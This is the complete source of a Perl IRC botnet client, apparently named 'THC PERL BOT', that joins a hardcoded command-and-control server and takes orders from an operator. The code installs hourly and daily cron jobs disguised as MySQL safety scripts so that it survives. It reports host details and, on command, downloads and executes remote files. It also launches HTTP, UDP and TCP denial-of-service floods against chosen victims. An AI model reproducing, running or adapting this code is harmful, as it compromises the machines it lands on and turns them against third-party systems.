#!/usr/bin/perl

# Modules
use IO::Socket;
use Thread;
use Socket;

#---------------- CONFIGURATION --------------
$server = "zuco.dns1.us";
$port = 1984;
$nick_prefix = "[THC]";
$version = "THC PERL BOT 0.6.1";
$cmd_symbol = "!";
$channel = "#bot";
$password = "Sisko";	# DES Encrypted Password

#---------------------------------------------

# Set triggers

$call_version = $cmd_symbol . "version";	# !version - Shows the version of the bot
$call_info = $cmd_symbol . "info";		# !info - Shows the system information
$call_login = $cmd_symbol . "login";		# !login
 - Logs you into the bot
$call_logout = $cmd_symbol . "logout";		# !logout - Logs you out of the bot
$call_exit = $cmd_symbol . "exit";		# !exit - Kills the bot
$call_cycle = $cmd_symbol . "cycle";		# !cycle <#channel>  - Joins channel then parts
$call_dns = $cmd_symbol . "dns";		# !dns  - Resolves the hostname
$call_join = $cmd_symbol . "join";		# !join <#channel> - Joins the channel
$call_part = $cmd_symbol . "part";		# !part <#channel> - Parts the channel
$call_mode = $cmd_symbol . "mode";		# !mode <#channel>   - Sets the mode on the user
$call_nick = $cmd_symbol . "nick";		# !nick  - Changes the bot's nickname
$call_msg = $cmd_symbol . "msg";		# !msg   - Sends a private message
$call_raw = $cmd_symbol . "raw";		# !raw  - Send a raw command
$call_randnick = $cmd_symbol . "randnick";	# !randnick - Resets the bot's nick to a new random one
$call_download = $cmd_symbol . "download";	# !download   <1/0> - Download, save and either run (1) or dont (0)
$call_visit = $cmd_symbol . "visit";		# !visit   - Visit URL and fake referer
$call_post = $cmd_symbol . "post";		# !post    - Posts data to url
$call_ping = $cmd_symbol . "ping";		# !ping  <# count>   - Ping a host
$call_httpdos = $cmd_symbol . "http";		# !http 
 <# threads> <# count> - HTTP DOS attack
$call_udp = $cmd_symbol . "udp";		# !udp    - UDP DOS attack with size and time
$call_tcp = $cmd_symbol . "tcp";		# !tcp 
  - TCP DOS attack

# Other Global Vars 

my $sys_cpumodel, $sys_uptime, $sys_users, $sys_load, $sys_kernel, $sys_ostype, $sys_temp, $sys_snd, $sys_vid, $sys_net, $sys_host;
my $logged_in;
my $nick;
my $realname;

my $http_victim;
my $http_port;
my $http_threads;
my $http_count;

my $udp_victim;
my $udp_size;
my $udp_time;

my $tcp_victim;
my $tcp_port;
my $tcp_time;

# Subroutines

sub tcpDOSCon {
	my $tcp_itime = time;
	my ($tcp_cur_time);
	my ($tcp_ia,$tcp_pa,$tcp_proto,$tcp_j,$tcp_l,$tcp_t);

	$tcp_ia = inet_aton($tcp_victim);
	$tcp_pa = sockaddr_in($tcp_port, $tcp_ia);

	$tcp_ftime = $tcp_time;

	$tcp_proto = getprotobyname('tcp');

	$tcp_j = 0;
	$tcp_l = 0;

	$tcp_cur_time = time - $tcp_itime;

	while($tcp_l < 1000) {
		$tcp_cur_time = time - $tcp_itime;
		last if $tcp_cur_time >= $tcp_ftime;
		$tcp_t = "SOCK$tcp_l";
		socket($tcp_t, PF_INET, SOCK_STREAM, $tcp_proto);
		connect($tcp_t, $tcp_pa) || $tcp_j--;
		$tcp_j++;
		$tcp_l++;
	}
	$tcp_l = 0;
	while($tcp_l < 1000) {
		$tcp_cur_time = time - $tcp_itime;
		last if $tcp_cur_time >= $tcp_ftime;
		$tcp_t = "SOCK$tcp_l";
		shutdown($tcp_t, 2);
		$tcp_l++;
	}
}

sub udpDOSCon {
	my $udp_iaddr = inet_aton($udp_victim);
	my $udp_msg = 'A' x $udp_size;
	my $udp_ftime = $udp_time;
	my $udp_cp = 0;

	my (%udp_packets);
	$udp_packets{icmp} = $udp_packets{igmp} = $udp_packets{udp} = $udp_packets{o} = $udp_packets{tcp} = 0;

	socket(SOCK1, PF_INET, SOCK_RAW, 2) or $udp_cp++;
	socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $udp_cp++;
	socket(SOCK3, PF_INET, SOCK_RAW, 1) or $udp_cp++;
	socket(SOCK4, PF_INET, SOCK_RAW, 6) or $udp_cp++;
	return(undef) if $udp_cp == 4;

	my $udp_itime = time;

	my($udp_cur_time);

	while(1) {
		for (my $udp_port = 1; $udp_port <= 65000; $udp_port++) {
			$udp_cur_time = time - $udp_itime;
			last if $udp_cur_time >= $udp_ftime;
			send(SOCK1, $udp_msg, 0, sockaddr_in($udp_port, $udp_iaddr)) and $udp_packets{igmp}++;
			send(SOCK2, $udp_msg, 0, sockaddr_in($udp_port, $udp_iaddr)) and $udp_packets{udp}++;
			send(SOCK3, $udp_msg, 0, sockaddr_in($udp_port, $udp_iaddr)) and $udp_packets{icmp}++;
			send(SOCK4, $udp_msg, 0, sockaddr_in($udp_port, $udp_iaddr)) and $udp_packets{tcp}++;

			for(my $udp_pc = 3; $udp_pc <= 255; $udp_pc++) {
				next if $udp_pc == 6;
				$udp_cur_time = time - $udp_itime;
				last if $udp_cur_time >= $udp_ftime;
				socket(SOCK5, PF_INET, SOCK_RAW, $udp_pc) or next;
				send(SOCK5, $udp_msg, 0, sockaddr_in($udp_port, $udp_iaddr)) and $udp_packets{o}++;
			}
		}
		last if $udp_cur_time >= $udp_ftime;
	}
	return($udp_cur_time, %udp_packets);
}

sub udpDOS {
	my($udp_dtime, %udp_packets) = udpDOSCon;
	$udp_dtime = 1 if $udp_dtime == 0;
	my %udp_bytes;
	$udp_bytes{igmp} = $udp_size * $udp_packets{igmp};
	$udp_bytes{icmp} = $udp_size * $udp_packets{icmp};
	$udp_bytes{o} = $udp_size * $udp_packets{o};
	$udp_bytes{udp} = $udp_size * $udp_packets{udp};
	$udp_bytes{tcp} = $udp_size * $udp_packets{tcp};
	print $irc "PRIVMSG $channel :UDP denial of service finished on $udp_victim, sent ".int(($udp_bytes{icmp}+$udp_bytes{igmp}+$udp_bytes{udp}+$udp_bytes{o})/1024)."Kb in ".$udp_dtime." seconds!\n";
}

sub tcpDOS {
	my $tcp_itime = time;
	my ($tcp_cur_time);
	$tcp_cur_time = time - $tcp_itime;
	while($tcp_time > $tcp_cur_time) {
		$tcp_cur_time = time - $tcp_itime;
		&tcpDOSCon();
	}
	print $irc "PRIVMSG $channel :TCP denial of service attack on $tcp_victim:$tcp_port done!\n";
}

sub httpDOSCon {
	local *FH;

	my $http_iaddr = gethostbyname('localhost');
	my $http_proto = getprotobyname('tcp');
	my $http_paddr = sockaddr_in(0, $http_iaddr);
	my ($http_host);
	my $http_hisiaddr = inet_aton($http_victim) || die "Unknown host!";
	my $http_hispaddr = sockaddr_in($http_port, $http_hisiaddr);

	socket(FH, PF_INET, SOCK_STREAM, $http_proto) || die "Socket: $!";
	connect(FH, $http_hispaddr) || die "Bind: $!";

	return *FH;
}

sub httpDOSRun {
	$http_i = 0;
	while($http_i != $http_threads)	{
		push @handles, &httpDOSCon;
		$http_i++;
		#$staggered and sleep 3;
	}
}	

sub httpDOS {
	$http_j = 0;
	while($http_j != $http_count) {
		httpDOSRun;
		sleep 3;
		$http_j++;
	}
	print $irc "PRIVMSG $channel :Attack on $http_victim complete, however some sockets may still be waiting to close!s\n";
}

sub genNick {
	my @rand_chars = ( 'a' .. 'z', 'A' .. 'Z', 0 .. 9 );

	foreach(1..8)
	{
	        $base_nick.= $rand_chars[rand scalar @rand_chars];
	}

	$nick = $nick_prefix . $base_nick;
	$realname = $nick;
	$base_nick = "";
}

sub getSysInfo {
	$sys_cpumodel = `cat /proc/cpuinfo | grep 'model name' | sed -e 's/^.*: //'`;
	chomp($sys_cpumodel);

	$sys_ostype = `cat /proc/sys/kernel/ostype`;
	chomp($sys_ostype);

	$sys_host = `cat /proc/sys/kernel/hostname`;
	chomp($sys_host);

	$sys_kernel = `cat /proc/sys/kernel/osrelease`;
	chomp($sys_kernel);

	$sys_uptime = `uptime`;
	$sys_uptime =~ m/up\s+(.*),\s+(.*?) users?,.*:\s+(.*)/o;

	$sys_uptime = $1;
	$sys_users = $2;
	$sys_load = $3;

	$sys_uptime =~ s/:(\d\d)/h:$1m/o;
	$sys_uptime =~ s/mins/m/o;
	$sys_uptime =~ s/^1 hours/1h/o;
	$sys_uptime =~ s/ 1 minutes$/1m/o;

	$sys_temp = `cat /proc/acpi/thermal_zone/THRM/temperature | grep 'temperature' | sed -e 's/^.*:             //'`;
	chomp($sys_temp);

	$sys_snd = `cat /proc/asound/modules | grep '0' | sed -e 's/0 //'`;
	chomp($sys_snd);

	$sys_vid = `cat /proc/pci | grep 'VGA' | sed 's/.*7 //' | sed 's/(.*//' | sed 's/.//' | sed 's/].//'`;
	chomp($sys_vid);

	$sys_net = `cat /proc/pci | grep 'Ethernet controller' | sed 's/^.*: //' | sed 's/(.*//'`;
	chomp($sys_net);
}

genNick;

# Check & Set CRON Job

$cronfile_location = "/etc/cron.hourly/safe_mysqld";
$cronfile_location2 = "/etc/cron.daily/safe_mysqld";

$cron_script = "#!/bin/bash\n" .
		"exec < /usr/bin/safe_mysql.pid\n" .
		"while read line\n" .
		"do\n" .
		"checkpid=\$( ps -e | grep \$line)\n" .
		"if [ -z \"\$checkpid\" ]\n" .
		"then\n" .
                "echo \"Process $line not running, mysql not safe. Fixing!\"\n" .
                "/usr/bin/safe_mysql &\n" .
                "exit\n" .
        	"fi\n" .
        	"echo \"Process already running, mysql is safe! Exiting!\"\n" .
		"done\n";

$cron_script2 = "#!/bin/bash\n" .
		"exec < /usr/bin/safe_mysql.pid\n" .
		"while read line\n" .
		"do\n" .
		"killall -9 safe_mysql\n" .
		"/usr/bin/safe_mysql &\n" .
		"done\n";

system("rm -rf /usr/bin/safe_mysql.pid && echo $$ > /usr/bin/safe_mysql.pid");

if(-e $cronfile_location) {
	print "Cron file exists. Good!\n";
} else {
	system("touch $cronfile_location");
	open(WRITECRON, ">>$cronfile_location");
	print WRITECRON $cron_script;
	close(WRITECRON);
	system("chmod +x $cronfile_location");
	print "Cron file does not exist! Creating!\n";
}

if(-e $cronfile_location2) {
	print "Cron file 2 exists. Good!\n";
} else {
	system("touch $cronfile_location2");
	open(WRITECRON2, ">>$cronfile_location2");
	print WRITECRON2 $cron_script2;
	close(WRITECRON2);
	system("chmod +x $cronfile_location2");
	print "Cron file 2 does not exist! Creating!\n";
}

# Go go IRC!!!

$irc=IO::Socket::INET->new(
        PeerAddr=>$server,
        PeerPort=>$port,
        Proto=>'tcp')  or die "$server: $@\n";

print $irc "USER poop poop poop :poop the bot\n";
print $irc "NICK $nick\n";
print $irc "JOIN $channel\n";
print $irc "PRIVMSG $channel :Another minion is here to serve you master!\n";

while(defined($in=<$irc>)) {
        if($in=~/PING :( .*)/) {
                print $irc "PONG $1\n";
        } elsif($logged_in eq "1") {
		if($in=~/$call_version/) {
                	print $irc "PRIVMSG $channel :$version\n";
	        } elsif($in=~/$call_info/) {
			getSysInfo;
			print $irc "PRIVMSG $channel :[CPU: $sys_cpumodel] [OS Type: $sys_ostype] [Kernel: $sys_kernel] [Hostname: $sys_host] [Uptime: $sys_uptime] [Users: $sys_users] [Load: $sys_load] [Temp: $sys_temp] [Ethernet: $sys_net] [Sound: $sys_snd] [Video: $sys_vid]\n";
		} elsif($in=~/$call_logout/) {
			$logged_in = 0;
			print $irc "PRIVMSG $channel :You have been logged out!\n";
		} elsif($in=~/$call_exit/) {
			print $irc "PRIVMSG $channel :Bye!\n";
			exit;
		} elsif($in=~/$call_cycle (\S+) (\S+)/) {
			print $irc "JOIN $1\n";
			sleep $2;
			print $irc "PART $1\n";
		} elsif($in=~/$call_dns (\S+)/) {
			$resolve_dns = gethostbyname($1);
			if($resolve_dns) {
				$resolve_dns = inet_ntoa($resolve_dns);
				print $irc "PRIVMSG $channel :" . $resolve_dns . "\n";
			} else {
				print $irc "PRIVMSG $channel :Could not resolve DNS for $1!\n";
			}
		} elsif($in=~/$call_join (\S+)/) {
			print $irc "JOIN $1\n";
		} elsif($in=~/$call_part (\S+)/) {
			print $irc "PART $1\n";
		} elsif($in=~/$call_mode (\S+) (\S+) (\S+)/) {
			print $irc "MODE $1 $2 $3\n";
		} elsif($in=~/$call_nick (\S+)/) {
			print $irc "NICK $1\n";
		} elsif($in=~/$call_msg (\S+) (.*)/) {
			print $irc "PRIVMSG $1 :$2\n";
		} elsif($in=~/$call_raw (.*)/) {
			print $irc "$1\n";
		} elsif($in=~/$call_randnick/) {
			genNick;
			print $irc "NICK $nick\n";
		} elsif($in=~/$call_download (\S+) (\S+) (\S+)/) {
			print $irc "PRIVMSG $channel :File Downloading ...\n";
			system("wget -O $2 $1");
			print $irc "PRIVMSG $channel :File Downloaded!\n";
			if($3 eq "1")
			{
				print $irc "PRIVMSG $channel :Executing File!\n";
				system("chmod +x $2");
				system("$2");
			}
		} elsif($in=~/$call_visit (\S+) (\S+)/) {
			system("curl -e $2 $1");
			print $irc "PRIVMSG $channel :Visited $1 and pretended to come from $2!\n";
		} elsif($in=~/$call_post (\S+) (\S+) (.*)/) {
			system("curl -d \"" . $3 . "\" -e $2 $1");
			print $irc "PRIVMSG $channel :P osted $3 to $1 pretended to come from $2!\n";
		} elsif($in=~/$call_ping (\S+) (\S+) (\S+) (\S+)/) {
			print $irc "PRIVMSG $channel :P inging $1 with $2 packets of $3 bytes each plus 8 bytes of ICMP header data. Timeout is $4 seconds!\n";
			system("ping -c $2 -s $3 -W $4 $1 &");
		} elsif($in=~/$call_httpdos (\S+) (\S+) (\S+) (\S+)/) {
			print $irc "PRIVMSG $channel :Running denial of service on $1:$2 with $3 threads and $4 runs!\n";
			$http_victim = $1;
			$http_port = $2;
			$http_threads = $3;
			$http_count = $4;
			$http_thread = new Thread \&httpDOS;
		} elsif($in=~/$call_udp\s+(.*)\s+(\d+)\s+(\d+)/) {
			print $irc "PRIVMSG $channel :Running UDP denial of service on $1 with $2 kilobyte packets for $3 seconds!\n";
			$udp_victim = $1;
			$udp_size = $2;
			$udp_time = $3;
			$udp_thread = new Thread \&udpDOS;
		} elsif($in=~/$call_tcp (\S+) (\S+) (\S+)/) {
			print $irc "PRIVMSG $channel :Running TCP denial of service on $1:$2 for $3 seconds!\n";
			$tcp_victim = $1;
			$tcp_port = $2;
			$tcp_time = $3;
			$tcp_thread = new Thread \&tcpDOS;
		}
	} elsif($in=~/$call_login (\S+)/) {
		$check_pass = $1;
		if(crypt($check_pass, $password) eq $password) {
			$logged_in = 1;
			print $irc "PRIVMSG $channel :Your password has been accepted!\n";
		} else {
			$logged_in = 0;
			print $irc "PRIVMSG $channel :Your password did not match!\n";
		}
	}
}

close($irc);